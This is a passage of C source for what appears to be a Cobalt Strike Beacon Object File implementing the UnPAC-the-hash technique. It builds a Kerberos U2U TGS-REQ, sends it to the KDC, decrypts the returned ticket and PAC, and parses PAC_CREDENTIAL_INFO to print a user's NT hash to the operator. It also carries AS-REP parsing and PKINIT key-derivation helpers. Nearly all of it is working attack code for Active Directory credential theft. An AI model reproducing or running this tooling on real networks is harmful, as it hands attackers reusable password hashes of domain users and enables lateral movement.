    BYTE* apOptTag = BuildContextTag(2, apOptBs, apOptBsLen, &apOptTagLen);
    memcpy(apReqContent + offset, apOptTag, apOptTagLen);
    offset += apOptTagLen;
    free(apOptBs);
    free(apOptTag);

    /* ticket [3] Ticket */
    int ticketTagLen;
    BYTE* ticketTag = BuildContextTag(3, ticket, ticketLen, &ticketTagLen);
    memcpy(apReqContent + offset, ticketTag, ticketTagLen);
    offset += ticketTagLen;
    free(ticketTag);

    /* authenticator [4] EncryptedData */
    /* EncryptedData ::= SEQUENCE { etype [0], cipher [2] } */
    static BYTE encDataContent[4096];  /* static to avoid BOF stack overflow */
    int edOffset = 0;

    /* etype [0] INTEGER 18 (AES256) */
    int etypeLen;
    BYTE* etype = BuildInteger(ETYPE_AES256_CTS_HMAC_SHA1, &etypeLen);
    int etypeTagLen;
    BYTE* etypeTag = BuildContextTag(0, etype, etypeLen, &etypeTagLen);
    memcpy(encDataContent + edOffset, etypeTag, etypeTagLen);
    edOffset += etypeTagLen;
    free(etype);
    free(etypeTag);

    /* cipher [2] OCTET STRING */
    int cipherLen;
    BYTE* cipher = BuildOctetString(encAuthenticator, encAuthLen, &cipherLen);
    int cipherTagLen;
    BYTE* cipherTag = BuildContextTag(2, cipher, cipherLen, &cipherTagLen);
    memcpy(encDataContent + edOffset, cipherTag, cipherTagLen);
    edOffset += cipherTagLen;
    free(cipher);
    free(cipherTag);

    int encDataSeqLen;
    BYTE* encDataSeq = BuildSequence(encDataContent, edOffset, &encDataSeqLen);
    int encDataTagLen;
    BYTE* encDataTag = BuildContextTag(4, encDataSeq, encDataSeqLen, &encDataTagLen);
    memcpy(apReqContent + offset, encDataTag, encDataTagLen);
    offset += encDataTagLen;
    free(encDataSeq);
    free(encDataTag);

    /* Build AP-REQ SEQUENCE */
    int apReqSeqLen;
    BYTE* apReqSeq = BuildSequence(apReqContent, offset, &apReqSeqLen);
    free(apReqContent);

    /* Wrap in APPLICATION 14 */
    BYTE* result = BuildApplication(14, apReqSeq, apReqSeqLen, outLen);
    free(apReqSeq);

    return result;
}

/* Build U2U TGS-REQ */
static BYTE* BuildU2UTgsReq(const char* user, const char* realm, BYTE* ticket, int ticketLen,
                            BYTE* sessionKey, int sessionKeyLen, int* outLen) {
    BYTE* reqBodyContent = (BYTE*)malloc(4096);
    int rbOffset = 0;
    int i;

    /* kdc-options [0] BIT STRING */
    /* 0x40810018 = forwardable, renewable, canonicalize, renewable-ok, enc-tkt-in-skey */
    BYTE kdcOptions[] = { 0x40, 0x81, 0x00, 0x18 };
    int kdcOptBsLen;
    BYTE* kdcOptBs = BuildBitString(kdcOptions, 4, &kdcOptBsLen);
    int kdcOptTagLen;
    BYTE* kdcOptTag = BuildContextTag(0, kdcOptBs, kdcOptBsLen, &kdcOptTagLen);
    memcpy(reqBodyContent + rbOffset, kdcOptTag, kdcOptTagLen);
    rbOffset += kdcOptTagLen;
    free(kdcOptBs);
    free(kdcOptTag);

    /* realm [2] Realm */
    int realmStrLen;
    BYTE* realmStr = BuildGeneralString(realm, &realmStrLen);
    int realmTagLen;
    BYTE* realmTag = BuildContextTag(2, realmStr, realmStrLen, &realmTagLen);
    memcpy(reqBodyContent + rbOffset, realmTag, realmTagLen);
    rbOffset += realmTagLen;
    free(realmStr);
    free(realmTag);

    /* sname [3] PrincipalName - target is ourselves */
    int snameLen;
    BYTE* sname = BuildPrincipalName(1, user, NULL, &snameLen);
    int snameTagLen;
    BYTE* snameTag = BuildContextTag(3, sname, snameLen, &snameTagLen);
    memcpy(reqBodyContent + rbOffset, snameTag, snameTagLen);
    rbOffset += snameTagLen;
    free(sname);
    free(snameTag);

    /* till [5] KerberosTime - tomorrow */
    SYSTEMTIME st;
    GetSystemTime(&st);
    char tillStr[32];
    sprintf(tillStr, "%04d%02d%02d%02d%02d%02dZ",
            st.wYear, st.wMonth, st.wDay + 1, st.wHour, st.wMinute, st.wSecond);
    int tillLen;
    BYTE* till = BuildGeneralizedTime(tillStr, &tillLen);
    int tillTagLen;
    BYTE* tillTag = BuildContextTag(5, till, tillLen, &tillTagLen);
    memcpy(reqBodyContent + rbOffset, tillTag, tillTagLen);
    rbOffset += tillTagLen;
    free(till);
    free(tillTag);

    /* nonce [7] UInt32 */
    int nonce = g_nonce + 1;
    int nonceLen;
    BYTE* nonceInt = BuildInteger(nonce, &nonceLen);
    int nonceTagLen;
    BYTE* nonceTag = BuildContextTag(7, nonceInt, nonceLen, &nonceTagLen);
    memcpy(reqBodyContent + rbOffset, nonceTag, nonceTagLen);
    rbOffset += nonceTagLen;
    free(nonceInt);
    free(nonceTag);

    /* etype [8] SEQUENCE OF Int32 */
    BYTE etypeContent[32];
    int etOffset = 0;
    int aes256Len, aes128Len, rc4Len;
    BYTE* aes256 = BuildInteger(18, &aes256Len);
    memcpy(etypeContent + etOffset, aes256, aes256Len);
    etOffset += aes256Len;
    free(aes256);
    BYTE* aes128 = BuildInteger(17, &aes128Len);
    memcpy(etypeContent + etOffset, aes128, aes128Len);
    etOffset += aes128Len;
    free(aes128);
    BYTE* rc4 = BuildInteger(23, &rc4Len);
    memcpy(etypeContent + etOffset, rc4, rc4Len);
    etOffset += rc4Len;
    free(rc4);

    int etypeSeqLen;
    BYTE* etypeSeq = BuildSequence(etypeContent, etOffset, &etypeSeqLen);
    int etypeTagLen;
    BYTE* etypeTag = BuildContextTag(8, etypeSeq, etypeSeqLen, &etypeTagLen);
    memcpy(reqBodyContent + rbOffset, etypeTag, etypeTagLen);
    rbOffset += etypeTagLen;
    free(etypeSeq);
    free(etypeTag);

    /* additional-tickets [11] SEQUENCE OF Ticket - our TGT for U2U */
    int addTicketsSeqLen;
    BYTE* addTicketsSeq = BuildSequence(ticket, ticketLen, &addTicketsSeqLen);
    int addTicketsTagLen;
    BYTE* addTicketsTag = BuildContextTag(11, addTicketsSeq, addTicketsSeqLen, &addTicketsTagLen);
    memcpy(reqBodyContent + rbOffset, addTicketsTag, addTicketsTagLen);
    rbOffset += addTicketsTagLen;
    free(addTicketsSeq);
    free(addTicketsTag);

    /* Build req-body SEQUENCE */
    int reqBodySeqLen;
    BYTE* reqBodySeq = BuildSequence(reqBodyContent, rbOffset, &reqBodySeqLen);
    free(reqBodyContent);

    /* Build Authenticator with checksum of req-body */
    int authenticatorLen;
    BYTE* authenticator = BuildU2UAuthenticator(user, realm, sessionKey, sessionKeyLen,
                                                 reqBodySeq, reqBodySeqLen, &authenticatorLen);
    if (!authenticator) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build U2U authenticator");
        free(reqBodySeq);
        return NULL;
    }

    /* Encrypt authenticator with session key (key usage 7) */
    int encAuthLen;
    BYTE* encAuth = KerberosEncrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_TGS_REQ_AUTH,
                                     sessionKey, sessionKeyLen, authenticator, authenticatorLen, &encAuthLen);
    free(authenticator);

    if (!encAuth) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to encrypt U2U authenticator");
        free(reqBodySeq);
        return NULL;
    }

    /* Build AP-REQ */
    int apReqLen;
    BYTE* apReq = BuildU2UApReq(ticket, ticketLen, encAuth, encAuthLen, &apReqLen);
    free(encAuth);

    if (!apReq) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build U2U AP-REQ");
        free(reqBodySeq);
        return NULL;
    }

    /* Build PA-TGS-REQ (padata-type 1) */
    static BYTE padataContent[4096];  /* static to avoid BOF stack overflow */
    int paOffset = 0;

    /* padata-type [1] INTEGER 1 */
    int ptLen;
    BYTE* pt = BuildInteger(1, &ptLen);
    int ptTagLen;
    BYTE* ptTag = BuildContextTag(1, pt, ptLen, &ptTagLen);
    memcpy(padataContent + paOffset, ptTag, ptTagLen);
    paOffset += ptTagLen;
    free(pt);
    free(ptTag);

    /* padata-value [2] OCTET STRING (AP-REQ) */
    int pvLen;
    BYTE* pv = BuildOctetString(apReq, apReqLen, &pvLen);
    int pvTagLen;
    BYTE* pvTag = BuildContextTag(2, pv, pvLen, &pvTagLen);
    memcpy(padataContent + paOffset, pvTag, pvTagLen);
    paOffset += pvTagLen;
    free(pv);
    free(pvTag);
    free(apReq);

    int padataSeqLen;
    BYTE* padataSeq = BuildSequence(padataContent, paOffset, &padataSeqLen);

    /* padata [3] SEQUENCE OF PA-DATA */
    int padataOuterSeqLen;
    BYTE* padataOuterSeq = BuildSequence(padataSeq, padataSeqLen, &padataOuterSeqLen);
    free(padataSeq);
    int padataTagLen;
    BYTE* padataTag = BuildContextTag(3, padataOuterSeq, padataOuterSeqLen, &padataTagLen);
    free(padataOuterSeq);

    /* Build TGS-REQ */
    static BYTE tgsReqContent[8192];  /* static to avoid BOF stack overflow */
    int tgsOffset = 0;

    /* pvno [1] INTEGER 5 */
    int pvnoLen;
    BYTE* pvno = BuildInteger(5, &pvnoLen);
    int pvnoTagLen;
    BYTE* pvnoTag = BuildContextTag(1, pvno, pvnoLen, &pvnoTagLen);
    memcpy(tgsReqContent + tgsOffset, pvnoTag, pvnoTagLen);
    tgsOffset += pvnoTagLen;
    free(pvno);
    free(pvnoTag);

    /* msg-type [2] INTEGER 12 (TGS-REQ) */
    int mtLen;
    BYTE* mt = BuildInteger(12, &mtLen);
    int mtTagLen;
    BYTE* mtTag = BuildContextTag(2, mt, mtLen, &mtTagLen);
    memcpy(tgsReqContent + tgsOffset, mtTag, mtTagLen);
    tgsOffset += mtTagLen;
    free(mt);
    free(mtTag);

    /* padata [3] */
    memcpy(tgsReqContent + tgsOffset, padataTag, padataTagLen);
    tgsOffset += padataTagLen;
    free(padataTag);

    /* req-body [4] */
    int reqBodyTagLen;
    BYTE* reqBodyTag = BuildContextTag(4, reqBodySeq, reqBodySeqLen, &reqBodyTagLen);
    memcpy(tgsReqContent + tgsOffset, reqBodyTag, reqBodyTagLen);
    tgsOffset += reqBodyTagLen;
    free(reqBodyTag);
    free(reqBodySeq);

    /* Build TGS-REQ SEQUENCE */
    int tgsReqSeqLen;
    BYTE* tgsReqSeq = BuildSequence(tgsReqContent, tgsOffset, &tgsReqSeqLen);

    /* Wrap in APPLICATION 12 */
    BYTE* result = BuildApplication(12, tgsReqSeq, tgsReqSeqLen, outLen);
    free(tgsReqSeq);

    return result;
}

/*
 * =============================================================================
 * U2U - TGS-REP Processing
 * =============================================================================
 */

/* Extract ticket enc-part cipher from TGS-REP ticket */
static BYTE* ExtractTicketEncPartFromTgsRep(BYTE* tgsRep, int tgsRepLen, int* cipherLen) {
    int offset = 0;
    int length;

    /* Skip APPLICATION 13 */
    if (tgsRep[offset] == 0x6D) {
        offset++;
        offset += DecodeLength(tgsRep, offset, &length);
    }

    /* Skip outer SEQUENCE */
    if (tgsRep[offset] == 0x30) {
        offset++;
        offset += DecodeLength(tgsRep, offset, &length);
    }

    /* Find ticket [5] */
    while (offset < tgsRepLen - 10) {
        if (tgsRep[offset] == 0xA5) {
            offset++;
            offset += DecodeLength(tgsRep, offset, &length);
            int ticketEnd = offset + length;

            /* Skip APPLICATION 1 if present */
            if (tgsRep[offset] == 0x61) {
                offset++;
                offset += DecodeLength(tgsRep, offset, &length);
            }

            /* Skip SEQUENCE */
            if (tgsRep[offset] == 0x30) {
                offset++;
                offset += DecodeLength(tgsRep, offset, &length);
            }

            /* Find enc-part [3] in ticket */
            while (offset < ticketEnd - 10) {
                if (tgsRep[offset] == 0xA3) {
                    offset++;
                    offset += DecodeLength(tgsRep, offset, &length);

                    /* EncryptedData SEQUENCE */
                    if (tgsRep[offset] == 0x30) {
                        offset++;
                        int encDataLen;
                        offset += DecodeLength(tgsRep, offset, &encDataLen);
                        int encDataEnd = offset + encDataLen;

                        /* Find cipher [2] */
                        while (offset < encDataEnd) {
                            if (tgsRep[offset] == 0xA2) {
                                offset++;
                                offset += DecodeLength(tgsRep, offset, &length);
                                if (tgsRep[offset] == 0x04) {
                                    offset++;
                                    offset += DecodeLength(tgsRep, offset, cipherLen);
                                    BYTE* cipher = (BYTE*)malloc(*cipherLen);
                                    memcpy(cipher, tgsRep + offset, *cipherLen);
                                    return cipher;
                                }
                            } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
                                offset++;
                                int skipLen;
                                offset += DecodeLength(tgsRep, offset, &skipLen);
                                offset += skipLen;
                            } else {
                                offset++;
                            }
                        }
                    }
                    break;
                } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
                    offset++;
                    int skipLen;
                    offset += DecodeLength(tgsRep, offset, &skipLen);
                    offset += skipLen;
                } else {
                    offset++;
                }
            }
            break;
        } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
            offset++;
            int skipLen;
            offset += DecodeLength(tgsRep, offset, &skipLen);
            offset += skipLen;
        } else {
            offset++;
        }
    }

    *cipherLen = 0;
    return NULL;
}

/* Extract PAC from EncTicketPart authorization-data */
static BYTE* ExtractPacFromEncTicketPart(BYTE* encTicketPart, int encTicketPartLen, int* pacLen) {
    int offset = 0;
    int length;

    /* Skip APPLICATION 3 if present */
    if (encTicketPart[offset] == 0x63) {
        offset++;
        offset += DecodeLength(encTicketPart, offset, &length);
    }

    /* Skip SEQUENCE */
    if (encTicketPart[offset] == 0x30) {
        offset++;
        offset += DecodeLength(encTicketPart, offset, &length);
    }

    /* Find authorization-data [10] */
    while (offset < encTicketPartLen - 10) {
        if (encTicketPart[offset] == 0xAA) {
            offset++;
            int authDataLen;
            offset += DecodeLength(encTicketPart, offset, &authDataLen);

            /* Parse authorization-data for PAC (ad-type 128) */
            /* May be wrapped in AD-IF-RELEVANT (type 1) */
            return ExtractPacFromAuthData(encTicketPart + offset, authDataLen, pacLen);
        } else if ((encTicketPart[offset] & 0xE0) == 0xA0) {
            offset++;
            int skipLen;
            offset += DecodeLength(encTicketPart, offset, &skipLen);
            offset += skipLen;
        } else {
            offset++;
        }
    }

    *pacLen = 0;
    return NULL;
}

/* Recursive extraction of PAC from AuthorizationData */
static BYTE* ExtractPacFromAuthData(BYTE* authData, int authDataLen, int* pacLen) {
    int offset = 0;
    int length;

    /* Skip SEQUENCE if present */
    if (authData[offset] == 0x30) {
        offset++;
        offset += DecodeLength(authData, offset, &length);
    }

    while (offset < authDataLen - 5) {
        if (authData[offset] == 0x30) {
            offset++;
            int elemLen;
            offset += DecodeLength(authData, offset, &elemLen);
            int elemEnd = offset + elemLen;

            int adType = -1;
            BYTE* adData = NULL;
            int adDataLen = 0;

            while (offset < elemEnd) {
                if (authData[offset] == 0xA0) { /* ad-type [0] */
                    offset++;
                    offset += DecodeLength(authData, offset, &length);
                    if (authData[offset] == 0x02) {
                        offset++;
                        int intLen = authData[offset++];
                        adType = 0;
                        for (int i = 0; i < intLen; i++) {
                            adType = (adType << 8) | authData[offset++];
                        }
                    }
                } else if (authData[offset] == 0xA1) { /* ad-data [1] */
                    offset++;
                    offset += DecodeLength(authData, offset, &length);
                    if (authData[offset] == 0x04) {
                        offset++;
                        offset += DecodeLength(authData, offset, &adDataLen);
                        adData = authData + offset;
                        offset += adDataLen;
                    }
                } else {
                    offset++;
                }
            }

            if (adType == 1 && adData) { /* AD-IF-RELEVANT - recurse */
                BYTE* result = ExtractPacFromAuthData(adData, adDataLen, pacLen);
                if (result) return result;
            } else if (adType == 128 && adData) { /* PAC */
                BYTE* result = (BYTE*)malloc(adDataLen);
                memcpy(result, adData, adDataLen);
                *pacLen = adDataLen;
                return result;
            }

            offset = elemEnd;
        } else {
            offset++;
        }
    }

    *pacLen = 0;
    return NULL;
}

/* Parse PAC structure and extract PAC_CREDENTIAL_INFO */
static void ParsePacAndExtractNtHash(BYTE* pac, int pacLen, BYTE* replyKey, int replyKeyLen) {
    if (pacLen < 8) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PAC too small");
        return;
    }

    DWORD cBuffers = *(DWORD*)pac;

    int offset = 8;
    for (DWORD i = 0; i < cBuffers && offset + 16 <= pacLen; i++) {
        DWORD ulType = *(DWORD*)(pac + offset);
        DWORD cbBufferSize = *(DWORD*)(pac + offset + 4);
        ULONGLONG bufferOffset = *(ULONGLONG*)(pac + offset + 8);

        /* Type 2 = PAC_CREDENTIAL_INFO */
        if (ulType == 2 && bufferOffset + cbBufferSize <= (ULONGLONG)pacLen) {
            BYTE* credInfo = pac + bufferOffset;

            if (cbBufferSize < 8) {
                continue;
            }

            DWORD encType = *(DWORD*)(credInfo + 4);
            BYTE* encData = credInfo + 8;
            int encDataLen = cbBufferSize - 8;

            /* Decrypt with AS reply key (key usage 16) */
            int decLen;
            BYTE* decrypted = KerberosDecrypt(encType, KRB_KEY_USAGE_PAC_CREDENTIAL,
                                              replyKey, replyKeyLen, encData, encDataLen, &decLen);

            if (decrypted) {
                ParsePacCredentialData(decrypted, decLen);
                free(decrypted);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt PAC_CREDENTIAL_INFO");
            }
        }

        offset += 16;
    }
}

/* Process TGS-REP and extract NT hash */
static void ProcessTgsRep(BYTE* tgsRep, int tgsRepLen, BYTE* sessionKey, int sessionKeyLen,
                          BYTE* replyKey, int replyKeyLen) {
    /* Check message type */
    if (tgsRep[0] == 0x7E) {
        /* KRB-ERROR */
        BeaconPrintf(CALLBACK_OUTPUT, "[!] TGS-REQ returned KRB-ERROR");
        int i;
        for (i = 0; i < tgsRepLen - 5; i++) {
            if (tgsRep[i] == 0xA6 && tgsRep[i+2] == 0x02) {
                int errCode = 0;
                int errLen = tgsRep[i+3];
                for (int j = 0; j < errLen; j++) {
                    errCode = (errCode << 8) | tgsRep[i+4+j];
                }
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Error code: %d - %s", errCode, GetKrbErrorDesc(errCode));
                break;
            }
        }
        return;
    }

    if (tgsRep[0] != 0x6D) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Unexpected TGS response type: 0x%02X", tgsRep[0]);
        return;
    }

    /* Extract ticket enc-part */
    int ticketEncPartLen;
    BYTE* ticketEncPart = ExtractTicketEncPartFromTgsRep(tgsRep, tgsRepLen, &ticketEncPartLen);
    if (!ticketEncPart) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract ticket enc-part from TGS-REP");
        return;
    }

    /* Decrypt with session key (key usage 2 for U2U ticket enc-part) */
    int decTicketLen;
    BYTE* decTicket = KerberosDecrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_TICKET_ENCPART,
                                       sessionKey, sessionKeyLen, ticketEncPart, ticketEncPartLen, &decTicketLen);
    free(ticketEncPart);

    if (!decTicket) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt ticket enc-part");
        return;
    }

    /* Extract PAC from authorization-data */
    int pacLen;
    BYTE* pac = ExtractPacFromEncTicketPart(decTicket, decTicketLen, &pacLen);
    free(decTicket);

    if (!pac) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract PAC from EncTicketPart");
        return;
    }

    /* Parse PAC and extract NT hash */
    ParsePacAndExtractNtHash(pac, pacLen, replyKey, replyKeyLen);
    free(pac);
}

/* Perform U2U TGS-REQ to extract NT hash */
static void PerformU2U(const char* kdcHost, const char* user, const char* realm,
                       BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessionKeyLen,
                       BYTE* replyKey, int replyKeyLen) {
    /* Build TGS-REQ */
    int tgsReqLen;
    BYTE* tgsReq = BuildU2UTgsReq(user, realm, ticket, ticketLen, sessionKey, sessionKeyLen, &tgsReqLen);
    if (!tgsReq) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build U2U TGS-REQ");
        return;
    }

    /* Send to KDC */
    int tgsRepLen;
    BYTE* tgsRep = SendToKdc(kdcHost, 88, tgsReq, tgsReqLen, &tgsRepLen);
    free(tgsReq);

    if (!tgsRep) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to send TGS-REQ to KDC");
        return;
    }

    /* Process TGS-REP */
    ProcessTgsRep(tgsRep, tgsRepLen, sessionKey, sessionKeyLen, replyKey, replyKeyLen);
    free(tgsRep);
}

/*
 * =============================================================================
 * UnPAC-the-hash - AS-REP Parsing
 * =============================================================================
 */

/* Extract enc-part cipher from AS-REP */
static BYTE* ExtractEncPartFromAsRep(BYTE* asRep, int asRepLen, int* cipherLen) {
    int offset = 0;
    int length;

    /* Skip APPLICATION 11 tag */
    if (asRep[offset] == 0x6B) {
        offset++;
        offset += DecodeLength(asRep, offset, &length);
    }

    /* Skip outer SEQUENCE */
    if (asRep[offset] == 0x30) {
        offset++;
        offset += DecodeLength(asRep, offset, &length);
    }

    /* Find enc-part [6] */
    while (offset < asRepLen - 10) {
        if (asRep[offset] == 0xA6) {
            offset++;
            offset += DecodeLength(asRep, offset, &length);

            /* EncryptedData SEQUENCE */
            if (asRep[offset] == 0x30) {
                offset++;
                int encDataLen;
                offset += DecodeLength(asRep, offset, &encDataLen);
                int encDataEnd = offset + encDataLen;

                /* Find cipher [2] */
                while (offset < encDataEnd) {
                    if (asRep[offset] == 0xA2) {
                        offset++;
                        offset += DecodeLength(asRep, offset, &length);

                        if (asRep[offset] == 0x04) {
                            offset++;
                            offset += DecodeLength(asRep, offset, cipherLen);

                            BYTE* cipher = (BYTE*)malloc(*cipherLen);
                            memcpy(cipher, asRep + offset, *cipherLen);
                            return cipher;
                        }
                    } else if ((asRep[offset] & 0xE0) == 0xA0) {
                        offset++;
                        int skipLen;
                        offset += DecodeLength(asRep, offset, &skipLen);
                        offset += skipLen;
                    } else {
                        offset++;
                    }
                }
            }
            break;
        } else if ((asRep[offset] & 0xE0) == 0xA0) {
            offset++;
            int skipLen;
            offset += DecodeLength(asRep, offset, &skipLen);
            offset += skipLen;
        } else {
            offset++;
        }
    }

    return NULL;
}

/* Extract session key from decrypted EncASRepPart */
static BYTE* ExtractSessionKey(BYTE* decrypted, int decryptedLen, int* keyLen, int* keyType) {
    int offset = 0;
    int length;

    /* Skip APPLICATION 25 if present */
    if (decrypted[offset] == 0x79) {
        offset++;
        offset += DecodeLength(decrypted, offset, &length);
    }

    /* Skip SEQUENCE */
    if (decrypted[offset] == 0x30) {
        offset++;
        offset += DecodeLength(decrypted, offset, &length);
    }

    /* Find key [0] */
    if (decrypted[offset] == 0xA0) {
        offset++;
        offset += DecodeLength(decrypted, offset, &length);

        /* EncryptionKey SEQUENCE */
        if (decrypted[offset] == 0x30) {
            offset++;
            offset += DecodeLength(decrypted, offset, &length);

            /* keytype [0] */
            if (decrypted[offset] == 0xA0) {
                offset++;
                offset += DecodeLength(decrypted, offset, &length);
                if (decrypted[offset] == 0x02) {
                    offset++;
                    int intLen = decrypted[offset++];
                    *keyType = 0;
                    for (int i = 0; i < intLen; i++) {
                        *keyType = (*keyType << 8) | decrypted[offset++];
                    }
                }
            }

            /* keyvalue [1] */
            if (decrypted[offset] == 0xA1) {
                offset++;
                offset += DecodeLength(decrypted, offset, &length);
                if (decrypted[offset] == 0x04) {
                    offset++;
                    offset += DecodeLength(decrypted, offset, keyLen);

                    BYTE* keyValue = (BYTE*)malloc(*keyLen);
                    memcpy(keyValue, decrypted + offset, *keyLen);
                    return keyValue;
                }
            }
        }
    }

    return NULL;
}

/* Extract PA-PAC-CREDENTIALS from AS-REP padata */
static BYTE* ExtractPaPacCredentials(BYTE* asRep, int asRepLen, int* credLen) {
    int offset = 0;
    int length;

    /* Skip APPLICATION 11 tag */
    if (asRep[offset] == 0x6B) {
        offset++;
        offset += DecodeLength(asRep, offset, &length);
    }

    /* Skip outer SEQUENCE */
    if (asRep[offset] == 0x30) {
        offset++;
        offset += DecodeLength(asRep, offset, &length);
    }

    /* Find padata [2] */
    int padataOffset = -1;
    int padataEnd = -1;

    while (offset < asRepLen - 10) {
        if (asRep[offset] == 0xA2) {
            offset++;
            int padataLen;
            offset += DecodeLength(asRep, offset, &padataLen);
            padataOffset = offset;
            padataEnd = offset + padataLen;
            break;
        } else if ((asRep[offset] & 0xE0) == 0xA0) {
            offset++;
            int skipLen;
            offset += DecodeLength(asRep, offset, &skipLen);
            offset += skipLen;
        } else {
            offset++;
        }
    }

    if (padataOffset < 0) return NULL;

    /* Parse padata SEQUENCE for type 167 */
    int pos = padataOffset;
    if (asRep[pos] == 0x30) {
        pos++;
        pos += DecodeLength(asRep, pos, &length);
    }

    while (pos < padataEnd - 5) {
        if (asRep[pos] != 0x30) {
            pos++;
            continue;
        }

        pos++;
        int paDataLen;
        pos += DecodeLength(asRep, pos, &paDataLen);
        int paDataEnd = pos + paDataLen;

        int padataType = -1;
        int valueOffset = -1;
        int valueLen = 0;

        while (pos < paDataEnd) {
            BYTE tag = asRep[pos];
            if (tag == 0xA1) {
                pos++;
                pos += DecodeLength(asRep, pos, &length);
                if (asRep[pos] == 0x02) {
                    pos++;
                    int intLen = asRep[pos++];
                    padataType = 0;
                    for (int i = 0; i < intLen; i++) {
                        padataType = (padataType << 8) | asRep[pos++];
                    }
                }
            } else if (tag == 0xA2) {
                pos++;
                int ctxLen;
                pos += DecodeLength(asRep, pos, &ctxLen);
                if (asRep[pos] == 0x04) {
                    pos++;
                    pos += DecodeLength(asRep, pos, &valueLen);
                    valueOffset = pos;
                    pos += valueLen;
                } else {
                    valueOffset = pos;
                    valueLen = ctxLen;
                    pos += ctxLen;
                }
            } else {
                pos++;
                if (pos < paDataEnd) {
                    int skipLen;
                    pos += DecodeLength(asRep, pos, &skipLen);
                    pos += skipLen;
                }
            }
        }

        if (padataType == PA_PAC_CREDENTIALS && valueOffset > 0) {
            BYTE* result = (BYTE*)malloc(valueLen);
            memcpy(result, asRep + valueOffset, valueLen);
            *credLen = valueLen;
            return result;
        }

        pos = paDataEnd;
    }

    return NULL;
}

/* Parse PAC_CREDENTIAL_DATA and extract NT hash */
static void ParsePacCredentialData(BYTE* data, int dataLen) {
    int i, j;

    if (dataLen < 8) {
        return;
    }

    /* PAC_CREDENTIAL_DATA is NDR encoded:
     * NTLM_SUPPLEMENTAL_CREDENTIAL contains the NT hash at offset +24
     */

    /* Method 1: Search for "NTLM" string (Unicode: 'N' 00 'T' 00 'L' 00 'M' 00) */
    for (i = 0; i < dataLen - 50; i++) {
        if (data[i] == 'N' && data[i+1] == 0 &&
            data[i+2] == 'T' && data[i+3] == 0 &&
            data[i+4] == 'L' && data[i+5] == 0 &&
            data[i+6] == 'M' && data[i+7] == 0) {

            /* NTLM_SUPPLEMENTAL_CREDENTIAL typically follows:
             * After package name + padding, look for the structure:
             * Version (4), Flags (4), LmPassword (16), NtPassword (16)
             * Total 40 bytes of credential data
             */
            for (j = i + 8; j < dataLen - 40; j++) {
                /* Look for Version=0 and reasonable Flags */
                if (*(DWORD*)(data + j) == 0) {
                    DWORD flags = *(DWORD*)(data + j + 4);
                    /* Common flags: 0x01 (NtPresent), 0x02 (LmPresent), etc */
                    if (flags > 0 && flags < 0x100) {
                        BYTE* lmHash = data + j + 8;
                        BYTE* ntHash = data + j + 24;

                        /* Check if NT hash looks valid (not all zeros, not all same) */
                        int hasData = 0;
                        for (int k = 0; k < 16; k++) {
                            if (ntHash[k] != 0) hasData = 1;
                        }

                        if (hasData) {
                            BeaconPrintf(CALLBACK_OUTPUT, "[+] NT Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                                ntHash[0], ntHash[1], ntHash[2], ntHash[3],
                                ntHash[4], ntHash[5], ntHash[6], ntHash[7],
                                ntHash[8], ntHash[9], ntHash[10], ntHash[11],
                                ntHash[12], ntHash[13], ntHash[14], ntHash[15]);
                            return;
                        }
                    }
                }
            }
        }
    }

    /* Method 2: Direct scan at expected offsets in PAC_CREDENTIAL_DATA */
    int offsets[] = {0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68};
    for (j = 0; j < 8; j++) {
        int off = offsets[j];
        if (off + 40 <= dataLen) {
            BYTE* ntHash = data + off + 24;

            int hasData = 0, unique = 0;
            BYTE seen[256] = {0};
            for (i = 0; i < 16; i++) {
                if (ntHash[i] != 0) hasData = 1;
                if (!seen[ntHash[i]]) {
                    seen[ntHash[i]] = 1;
                    unique++;
                }
            }

            if (hasData && unique >= 6) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] NT Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                    ntHash[0], ntHash[1], ntHash[2], ntHash[3],
                    ntHash[4], ntHash[5], ntHash[6], ntHash[7],
                    ntHash[8], ntHash[9], ntHash[10], ntHash[11],
                    ntHash[12], ntHash[13], ntHash[14], ntHash[15]);
                return;
            }
        }
    }
}

/*
 * =============================================================================
 * kTruncate - RFC 4556 Key Derivation
 * =============================================================================
 */

/* Compute SHA-1 hash */
static void ComputeSha1(BYTE* data, int dataLen, BYTE* hash) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    DWORD hashLen = 20;

    if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
            CryptHashData(hHash, data, dataLen, 0);
            CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
}

/* kTruncate function - RFC 4556 Section 3.2.3.1 */
static void KTruncate(int k, BYTE* x, int xLen, BYTE* result) {
    int offset = 0;
    BYTE counter = 0;
    BYTE* toHash = (BYTE*)malloc(1 + xLen);

    while (offset < k) {
        BYTE hash[20];
        int copyLen;

        /* Hash = SHA1(counter || x) */
        toHash[0] = counter;
        memcpy(toHash + 1, x, xLen);
        ComputeSha1(toHash, 1 + xLen, hash);

        /* Copy hash bytes to result */
        copyLen = (k - offset < 20) ? (k - offset) : 20;
